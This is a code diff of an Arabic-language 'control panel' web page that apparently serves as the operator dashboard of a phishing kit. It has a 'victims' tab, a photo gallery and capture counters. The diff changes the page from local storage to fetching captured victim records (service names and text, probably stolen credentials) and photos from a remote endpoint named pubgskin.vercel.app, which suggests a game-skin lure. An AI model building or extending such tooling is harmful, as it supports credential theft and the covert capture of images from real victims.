@@ -1,93 +1,78 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>💀 لوحة التحكم</title>
-    <style>
-        :root { --red: #ff0040; --gold: #ffaa00; --green: #00ff41; --dark: #0a0a0a; }
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family:'Courier New',monospace; background:#000; color:#fff; min-height:100vh; padding:16px; }
-        .header { text-align:center; margin-bottom:16px; }
-        .skull { font-size:50px; animation:pulse 1s infinite; }
-        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.1)} }
-        h1 { color:var(--red); font-size:20px; text-shadow:0 0 20px var(--red); }
-        .nav { display:flex; gap:4px; margin-bottom:16px; flex-wrap:wrap; }
-        .nav-btn { flex:1; min-width:55px; padding:10px 4px; background:var(--dark); border:1px solid #333; color:#fff; border-radius:8px; cursor:pointer; font-family:'Courier New',monospace; font-size:10px; text-align:center; }
-        .nav-btn.active { border-color:var(--red); color:var(--red); }
-        .page { display:none; }
-        .page.active { display:block; }
-        .card { background:var(--dark); border:1px solid #333; border-radius:12px; padding:16px; margin-bottom:12px; }
-        .card h2 { color:var(--gold); font-size:14px; margin-bottom:12px; }
-        .log-item { background:#050000; border:1px solid #333; border-radius:8px; padding:12px; margin-bottom:6px; }
-        .log-item .time { color:#666; font-size:10px; }
-        .log-item .service { color:var(--red); font-size:12px; font-weight:bold; }
-        .log-item .data { color:#aaa; font-size:11px; margin-top:4px; }
-        .gallery-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:6px; }
-        .gallery-item { aspect-ratio:1; border-radius:8px; overflow:hidden; border:1px solid #333; cursor:pointer; background:#111; }
-        .gallery-item img { width:100%; height:100%; object-fit:cover; }
-        .stats-row { display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; margin-bottom:16px; }
-        .stat-card { background:var(--dark); border:1px solid #333; border-radius:10px; padding:14px; text-align:center; }
-        .stat-card .num { color:var(--red); font-size:26px; font-weight:bold; }
-        .stat-card .txt { color:#666; font-size:10px; margin-top:4px; }
-        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:999; justify-content:center; align-items:center; padding:20px; }
-        .modal.show { display:flex; }
-        .modal img { max-width:95%; max-height:85vh; border-radius:10px; }
-        .modal .close { position:absolute; top:20px; right:20px; color:#fff; font-size:30px; cursor:pointer; background:rgba(255,0,0,0.5); width:40px; height:40px; border-radius:50%; display:flex; align-items:center; justify-content:center; }
-        .empty { text-align:center; color:#666; padding:30px; font-size:13px; }
-        .refresh-btn { width:100%; padding:12px; background:var(--dark); border:1px solid #333; color:#fff; border-radius:8px; cursor:pointer; font-size:13px; margin-bottom:12px; }
-        @keyframes pulse2 { 0%,100%{opacity:1} 50%{opacity:0.4} }
-        .live-dot { display:inline-block; width:8px; height:8px; background:var(--green); border-radius:50%; animation:pulse2 1s infinite; margin-left:4px; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>💀 لوحة التحكم</title>
+<style>
+:root{--red:#ff0040;--gold:#ffaa00;--green:#00ff41;--dark:#0a0a0a}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Courier New',monospace;background:#000;color:#fff;min-height:100vh;padding:16px}
+.header{text-align:center;margin-bottom:16px}
+.skull{font-size:50px;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+h1{color:var(--red);font-size:20px;text-shadow:0 0 20px var(--red)}
+.nav{display:flex;gap:4px;margin-bottom:16px}
+.nav-btn{flex:1;padding:10px;background:var(--dark);border:1px solid #333;color:#fff;border-radius:8px;cursor:pointer;font-size:11px;text-align:center}
+.nav-btn.active{border-color:var(--red);color:var(--red)}
+.page{display:none}
+.page.active{display:block}
+.card{background:var(--dark);border:1px solid #333;border-radius:12px;padding:16px;margin-bottom:12px}
+.card h2{color:var(--gold);font-size:14px;margin-bottom:12px}
+.log-item{background:#050000;border:1px solid #333;border-radius:8px;padding:12px;margin-bottom:6px}
+.log-item .time{color:#666;font-size:10px}
+.log-item .service{color:var(--red);font-size:12px;font-weight:bold}
+.log-item .data{color:#aaa;font-size:11px;margin-top:4px}
+.gallery-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px}
+.gallery-item{aspect-ratio:1;border-radius:8px;overflow:hidden;border:1px solid #333;cursor:pointer;background:#111}
+.gallery-item img{width:100%;height:100%;object-fit:cover}
+.stats-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:16px}
+.stat-card{background:var(--dark);border:1px solid #333;border-radius:10px;padding:14px;text-align:center}
+.stat-card .num{color:var(--red);font-size:26px;font-weight:bold}
+.stat-card .txt{color:#666;font-size:10px;margin-top:4px}
+.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:999;justify-content:center;align-items:center;padding:20px}
+.modal.show{display:flex}
+.modal img{max-width:95%;max-height:85vh;border-radius:10px}
+.modal .close{position:absolute;top:20px;right:20px;color:#fff;font-size:30px;cursor:pointer}
+.empty{text-align:center;color:#666;padding:30px;font-size:13px}
+.refresh-btn{width:100%;padding:12px;background:var(--dark);border:1px solid #333;color:#fff;border-radius:8px;cursor:pointer;font-size:13px;margin-bottom:12px}
+@keyframes pulse2{0%,100%{opacity:1}50%{opacity:0.4}}
+.live-dot{display:inline-block;width:8px;height:8px;background:var(--green);border-radius:50%;animation:pulse2 1s infinite;margin-left:4px}
+</style>
 </head>
 <body>
-
-<div class="header">
-    <div class="skull">💀</div>
-    <h1>لوحة التحكم</h1>
-</div>
-
+<div class="header"><div class="skull">💀</div><h1>لوحة التحكم</h1></div>
 <div class="nav">
-    <button class="nav-btn active" onclick="showTab('dashboard')">📊 لوحة</button>
-    <button class="nav-btn" onclick="showTab('victims')">👥 الضحايا</button>
-    <button class="nav-btn" onclick="showTab('gallery')">📸 معرض</button>
+<button class="nav-btn active" onclick="showTab('dashboard')">📊 لوحة</button>
+<button class="nav-btn" onclick="showTab('victims')">👥 ضحايا</button>
+<button class="nav-btn" onclick="showTab('gallery')">📸 معرض</button>
 </div>
 
 <div class="page active" id="tab-dashboard">
-    <div class="stats-row">
-        <div class="stat-card"><div class="num" id="stat-victims">0</div><div class="txt">ضحايا</div></div>
-        <div class="stat-card"><div class="num" id="stat-photos">0</div><div class="txt">صور</div></div>
-        <div class="stat-card"><div class="num" id="stat-today">0</div><div class="txt">اليوم</div></div>
-    </div>
-    <button class="refresh-btn" onclick="loadAll()">🔄 تحديث البيانات</button>
-    <div class="card">
-        <h2>🕐 آخر النشاطات <span class="live-dot"></span></h2>
-        <div id="recent-logs"><div class="empty">⏳ اضغط تحديث...</div></div>
-    </div>
+<div class="stats-row">
+<div class="stat-card"><div class="num" id="stat-victims">0</div><div class="txt">ضحايا</div></div>
+<div class="stat-card"><div class="num" id="stat-photos">0</div><div class="txt">صور</div></div>
+<div class="stat-card"><div class="num" id="stat-today">0</div><div class="txt">اليوم</div></div>
+</div>
+<button class="refresh-btn" onclick="loadAll()">🔄 تحديث من السيرفر</button>
+<div class="card"><h2>🕐 آخر النشاطات <span class="live-dot"></span></h2><div id="recent-logs"></div></div>
 </div>
 
 <div class="page" id="tab-victims">
-    <button class="refresh-btn" onclick="loadVictims()">🔄 تحديث</button>
-    <div class="card">
-        <h2>👥 سجل الضحايا</h2>
-        <div id="victims-list"><div class="empty">⏳ اضغط تحديث...</div></div>
-    </div>
+<button class="refresh-btn" onclick="loadVictims()">🔄 تحديث</button>
+<div class="card"><h2>👥 سجل الضحايا</h2><div id="victims-list"></div></div>
 </div>
 
 <div class="page" id="tab-gallery">
-    <button class="refresh-btn" onclick="loadGallery()">🔄 تحديث</button>
-    <div class="card">
-        <h2>📸 معرض الصور</h2>
-        <div class="gallery-grid" id="gallery-grid"><div class="empty">⏳ اضغط تحديث...</div></div>
-    </div>
+<button class="refresh-btn" onclick="loadGallery()">🔄 تحديث</button>
+<div class="card"><h2>📸 معرض الصور</h2><div class="gallery-grid" id="gallery-grid"></div></div>
 </div>
 
-<div class="modal" id="modal" onclick="closeModal()">
-    <span class="close">✕</span>
-    <img id="modalImg" src="" alt="">
-</div>
+<div class="modal" id="modal" onclick="closeModal()"><span class="close">✕</span><img id="modalImg" src=""></div>
 
 <script>
+var API='https://pubgskin.vercel.app/api/save';
+
 function showTab(tab){
 document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});
 document.querySelectorAll('.nav-btn').forEach(function(b){b.classList.remove('active');});
@@ -99,18 +84,16 @@ if(tab==='victims')loadVictims();
 if(tab==='gallery')loadGallery();
 }
 
-function getData(){
-return JSON.parse(localStorage.getItem('mc_dashboard')||'{"victims":[],"gallery":[]}');
+async function fetchData(){
+var r=await fetch(API);
+return await r.json();
 }
 
-function loadAll(){
-loadDashboard();
-loadVictims();
-loadGallery();
-}
+function loadAll(){loadDashboard();loadVictims();loadGallery();}
 
-function loadDashboard(){
-var data=getData();
+async function loadDashboard(){
+try{
+var data=await fetchData();
 var victims=data.victims||[];
 var gallery=data.gallery||[];
 var today=new Date().toDateString();
@@ -121,50 +104,36 @@ document.getElementById('stat-photos').textContent=gallery.length;
 document.getElementById('stat-today').textContent=todayCount;
 var html='';
 victims.slice(-10).reverse().forEach(function(v){
-html+='<div class="log-item">';
-html+='<div class="time">🕐 '+(v.timestamp?new Date(v.timestamp).toLocaleString('ar-EG'):'')+'</div>';
-html+='<div class="service">'+(v.service||'غير معروف')+'</div>';
-html+='<div class="data">'+(v.text||v.data||'')+'</div>';
-html+='</div>';
+html+='<div class="log-item"><div class="time">🕐 '+(v.timestamp?new Date(v.timestamp).toLocaleString('ar-EG'):'')+'</div><div class="service">'+(v.service||'')+'</div><div class="data">'+(v.text||'')+'</div></div>';
 });
-document.getElementById('recent-logs').innerHTML=html||'<div class="empty">لا توجد سجلات</div>';
+document.getElementById('recent-logs').innerHTML=html||'<div class="empty">لا سجلات</div>';
+}catch(e){}
 }
 
-function loadVictims(){
-var data=getData();
-var victims=data.victims||[];
+async function loadVictims(){
+try{
+var data=await fetchData();
 var html='';
-victims.reverse().forEach(function(v){
-html+='<div class="log-item">';
-html+='<div class="time">🕐 '+(v.timestamp?new Date(v.timestamp).toLocaleString('ar-EG'):'')+'</div>';
-html+='<div class="service">'+(v.service||'غير معروف')+'</div>';
-html+='<div class="data">'+(v.text||v.data||'')+'</div>';
-html+='</div>';
+(data.victims||[]).reverse().forEach(function(v){
+html+='<div class="log-item"><div class="time">🕐 '+(v.timestamp?new Date(v.timestamp).toLocaleString('ar-EG'):'')+'</div><div class="service">'+(v.service||'')+'</div><div class="data">'+(v.text||'')+'</div></div>';
 });
-document.getElementById('victims-list').innerHTML=html||'<div class="empty">لا يوجد ضحايا</div>';
+document.getElementById('victims-list').innerHTML=html||'<div class="empty">لا ضحايا</div>';
+}catch(e){}
 }
 
-function loadGallery(){
-var data=getData();
-var gallery=data.gallery||[];
+async function loadGallery(){
+try{
+var data=await fetchData();
 var html='';
-gallery.reverse().forEach(function(g){
-if(g.url){
-html+='<div class="gallery-item" onclick="openModal(\''+g.url+'\')"><img src="'+g.url+'" alt=""></div>';
-}
+(data.gallery||[]).reverse().forEach(function(g){
+if(g.url)html+='<div class="gallery-item" onclick="openModal(\''+g.url+'\')"><img src="'+g.url+'"></div>';
 });
-document.getElementById('gallery-grid').innerHTML=html||'<div class="empty">📭 لا توجد صور</div>';
+document.getElementById('gallery-grid').innerHTML=html||'<div class="empty">📭 لا صور</div>';
+}catch(e){}
 }
 
-function openModal(url){
-document.getElementById('modalImg').src=url;
-document.getElementById('modal').classList.add('show');
-}
-
-function closeModal(){
-document.getElementById('modal').classList.remove('show');
-}
-
+function openModal(u){document.getElementById('modalImg').src=u;document.getElementById('modal').classList.add('show');}
+function closeModal(){document.getElementById('modal').classList.remove('show');}
 loadDashboard();
 </script>
 </body>
